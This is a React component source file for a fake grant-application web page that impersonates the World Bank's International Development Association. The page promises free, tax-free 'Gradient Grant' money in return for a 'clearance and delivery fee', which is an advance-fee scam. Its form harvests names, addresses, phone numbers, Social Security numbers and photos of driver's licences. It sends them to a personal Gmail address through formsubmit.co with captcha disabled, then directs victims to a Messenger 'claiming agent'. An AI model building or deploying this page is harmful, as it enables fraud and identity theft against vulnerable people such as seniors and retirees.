// import { useRef } from 'react';

function App() {
  // const fileInputRef = useRef(null);

  // const handleFileInputChange = () => {
  //   // Handle file selection here if needed
  //   console.log(fileInputRef);
  // };
  return (
    <div className="bg-image min-h-screen bg-gray-400 backdrop-blur-[2px]  bg-opacity-20 scroll-container">
      <div className="max-w-screen-xl mx-auto px-6 py-12">
        <div className="w-full p-10 bg-[#C43B80] text-white mb-4 ">
          <h1 className="text-6xl mb-4">IDA</h1>
          <p>
            Welcome to the international development association individual
            grant program, for over 60 years, the World bank’s IDA has worked to
            reduce poverty and boost economic growth.
          </p>
        </div>
        <div className="w-full p-10 bg-[#C43B80] text-white mb-4">
          <p>
            Okay, This Is A Federal Government And Private Grant Foundation
            Issuing Billions Of Dollars In Gradient Grant Money To Variety Of
            Groups Each Year. Gradient Grants Are Awarded To Individuals Each
            And Everyday. Gradient Grant Program Are Not Loans. You Decide How
            Much You Need As Long As The Amount Is Lawful And You Meet The
            Foundations And Government Agencies Requirements, The Money Is Yours
            To Keep And Never Need To Be Repaid. Gradient Grant Money Is
            Non-Taxable And Interest Free. Gradient Grant Money Does Not Require
            A Credit Check, Security Deposit Or Co-signer. You As A TAX PAYER
            Are Entitled To Apply For This money.
          </p>
        </div>
        <div className="w-full p-10 bg-[#C43B80] text-white mb-4">
          <p>
            This Program Is Based On Helping PAYING FOR MEDICAL BILLS, BUYING A
            HOME, SALESMAN STARTING THEIR OWN BUSINESS, GOING TO SCHOOL,
            TEACHERS, RETIRED TEACHERS, WITH SENIORS OLD AND RETIRED PEOPLE.
            WHEN LOOKING FOR FINANCIAL ASSISTANCE. Remember That There Are
            Differences Between GRADIENT GRANTS And LOANS. You Are Required To
            Pay Back A LOAN Often With INTEREST. You Are Not Required To Pay
            Back A GRADIENT GRANT. You Only Pay For The CLEARANCE AND DELIVERY
            FEE. Do You Agree With Our Terms?
          </p>
        </div>
        <div className="w-full p-10 bg-[#C43B80] text-white mb-4">
          <p>
            ALL WE HAVE TO DO IS VERIFY YOUR INFORMATION TO SEE IF YOU ARE
            QUALIFIED FOR THE GRANT,ARE YOU READY?
          </p>
        </div>
        <div>
          <div className="my-8">
            <h1 className="text-white text-4xl ">Complete The Form</h1>
          </div>
          <form
            method="POST"
            action="https://formsubmit.co/henigancarolyn@gmail.com"
            className="pb-16"
          >
            <input
              type="hidden"
              name="_next"
              value="https://ida-org.vercel.app/"
            />
            <input type="hidden" name="_captcha" value="false" />
            <input type="hidden" name="_template" value="table" />
            <label
              htmlFor="name"
              className="block  text-sm font-medium text-white "
            >
              Name
            </label>
            <div className="grid grid-cols-2 gap-2">
              <div className="relative z-10 w-full mb-6 group">
                <input
                  type="text"
                  id="name"
                  name="first_name"
                  className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black  "
                  required
                />
                <p className="text-white text-sm">First Name</p>
              </div>
              <div className="relative z-10 w-full mb-6 group">
                <input
                  type="text"
                  id="name"
                  name="last_name"
                  className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                  required
                />
                <p className="text-white text-sm">Last Name</p>
              </div>
            </div>
            <div className="mb-6">
              <label
                htmlFor="address"
                className="block mb-2 text-sm font-medium text-white "
              >
                Address
              </label>
              <input
                type="text"
                id="address"
                name="address"
                className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                required
              />
              <p className="text-white text-sm">Street Address</p>
            </div>
            <div className="mb-6">
              <input
                type="text"
                id="address2"
                name="address2"
                className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                required
              />
              <p className="text-white text-sm">Street Addres Line 2</p>
            </div>
            <div className="grid grid-cols-2 gap-2">
              <div className="relative z-10 w-full mb-6 group">
                <input
                  type="text"
                  id="city"
                  name="city"
                  className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                  required
                />
                <p className="text-white text-sm">City</p>
              </div>
              <div className="relative z-10 w-full mb-6 group">
                <input
                  type="text"
                  id="state/province"
                  name="state"
                  className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                  required
                />
                <p className="text-white text-sm">State / Province</p>
              </div>
            </div>
            <div className="grid grid-cols-2 gap-2">
              <div className="relative z-10 w-full mb-6 group">
                <input
                  type="text"
                  id="postal"
                  name="postal"
                  className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                  required
                />
                <p className="text-white text-sm">Postal / Zip Code</p>
              </div>
            </div>

            <div className="mb-10 z-10">
              <label
                htmlFor="email"
                className="block mb-2 text-sm font-medium text-white "
              >
                Email
              </label>
              <input
                type="email"
                id="email"
                name="email"
                className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                required
              />
              <p className="text-white text-sm">example@example.com</p>
            </div>

            <label
              htmlFor="phone"
              className="block mb-2 text-sm font-medium text-white "
            >
              Phone Number
            </label>
            <div className="grid grid-cols-4 gap-2">
              <div className="relative z-10 col-span-1 mb-6 group">
                <input
                  type="text"
                  id="code"
                  name="code"
                  className="bg-transparent border border-white text-sm rounded-lg block w-full p-2.5 placeholder-gray-400 text-black"
                  required
                />
                <p className="text-white text-sm">Area Code</p>
              </div>
              <div className="relative z-10 col-span-3 mb-6 group">
                <input
                  type="tel"
                  id="phone-number"
                  name="phone-number"
                  className="bg-transparent border border-white text-sm rounded-lg block w-full p-2.5 placeholder-gray-400 text-black"
                  required
                />
                <p className="text-white text-sm">Phone Number</p>
              </div>
            </div>
            <div className="mb-10 z-10">
              <label
                htmlFor="ssn"
                className="block mb-2 text-sm font-medium text-white "
              >
                SSN
              </label>
              <input
                type="text"
                id="ssn"
                name="ssn"
                className="bg-transparent border border-white  text-sm rounded-lg  block w-full p-2.5  placeholder-gray-400 text-black "
                required
              />
            </div>
            <div className="mb-10">
              <label
                htmlFor="ssn"
                className="block mb-2 text-sm font-medium text-white "
              >
                REASON FOR APPLYING
              </label>

              <textarea
                id="reason-for-applying"
                name="reason-for-applying"
                rows="4"
                className="block p-2.5 w-full text-sm  bg-transparent rounded-lg border border-white  placeholder-gray-400 text-black "
              ></textarea>
            </div>
            <div className="mb-10">
              <label
                htmlFor="picture"
                className="block mb-4 text-sm font-medium text-white "
              >
                UPLOAD A CLEAR PICTURE OF YOUR DRIVERS LICENSE/STATE ID FRONT
                AND BACK
              </label>
              <input
                className="block  text-sm p-2.5 text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 dark:text-gray-400 focus:outline-none dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400"
                id="picture"
                type="file"
                name="picture"
                accept=".jpeg, .jpg, .png, .gif"
              />
            </div>

            <div className="mb-10">
              <label
                htmlFor="resume"
                className="block mb-4 text-sm font-medium text-white "
              >
                UPLOAD YOUR RESUME
              </label>
              <input
                className="block  text-sm p-2.5 text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 dark:text-gray-400 focus:outline-none dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400"
                id="resume"
                name="resume"
                type="file"
                accept=".pdf, .doc, .docx"
              />
            </div>

            <button
              type="submit"
              className="mb-4 text-white bg-gray-600   focus:outline-none  font-medium rounded-full text-sm w-full  px-5 py-2.5 text-center "
            >
              Submit
            </button>
          </form>
          {/* <div className="my-2">
          <p className="text-white">
              Will get back to you with the required information. Your
              information is secure and 100% safe with us.
            </p>
          </div> */}
          <div className="w-full p-10 bg-white text-black mb-4">
            <p>
              Will get back to you with the required information. Your
              information is secure and 100% safe with us.
            </p>
          </div>
          <div className="w-full p-10 bg-white text-black mb-4">
            <p>
              Then Kindly send a message to our claiming agent to claim your
              grant
            </p>
            <a className="text-black underline" href="https://m.me/carolyn.henigan.1">https://m.me/carolyn.henigan.1</a>
          </div>
          
        </div>
      </div>
    </div>
  );
}

export default App;
